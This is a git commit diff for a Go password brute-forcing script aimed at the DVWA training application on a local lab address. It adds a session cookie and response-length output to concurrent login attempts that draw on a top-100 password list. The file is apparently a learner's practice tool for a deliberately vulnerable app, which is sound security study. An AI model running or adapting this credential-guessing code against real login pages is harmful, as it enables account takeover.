0d4f9c80fda7c068cc078f5a5a8839f0c0c22b85
Zonke <zokcon@163.com>
2020-12-17 01:45:22 +0800

    v0.1带上cookie，但是结果排序还没实现[D

--- main/brute.go
+++ main/brute.go
@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"net/http"
 	"os"
 	"strings"
@@ -16,9 +17,12 @@ import (
 //}
 
 func main()  {
+	//var r []byte
 	var wg sync.WaitGroup
 	wg.Add(100)
+	//filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top5.txt"
 	filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"
+
 	f, err := os.Open(filePath)
 	if err != nil{
 		fmt.Println("err:", err)
@@ -32,17 +36,31 @@ func main()  {
 				break
 			}
 		}
+
 		url := "http://192.168.124.26/dvwa/vulnerabilities/brute/?username=admin&password=" + string(line) + "&Login=Login#"
 		go func(url string, wg *sync.WaitGroup) {
-			//fmt.Println(url)
 
-			res, err := http.Get(url)
+			//res, err := http.Get(url)
+
+			resp, err := http.NewRequest("GET", url, nil)
+			resp.Header.Add("Cookie","security=low; security=low; PHPSESSID=q31peq2jk4r1osp45r18hhhjk6")
+			client := http.Client{}
+			res, err := client.Do(resp)
 			if err != nil {
 				fmt.Println("err:", err)
 			}
+
 			if res.StatusCode == 200 {
-				fmt.Println(*res)
-				//fmt.Println(res)
+				//fmt.Println(*res)
+				body_, err := ioutil.ReadAll(res.Body)  // 读取body内容，二进制流方式
+				if err != nil{
+					fmt.Println("err:", err)
+				}
+				fmt.Println(url)
+				fmt.Println(len(string(body_)))
+				defer res.Body.Close()
+				//res.Close
+				// :
 			}
 
 			wg.Done()
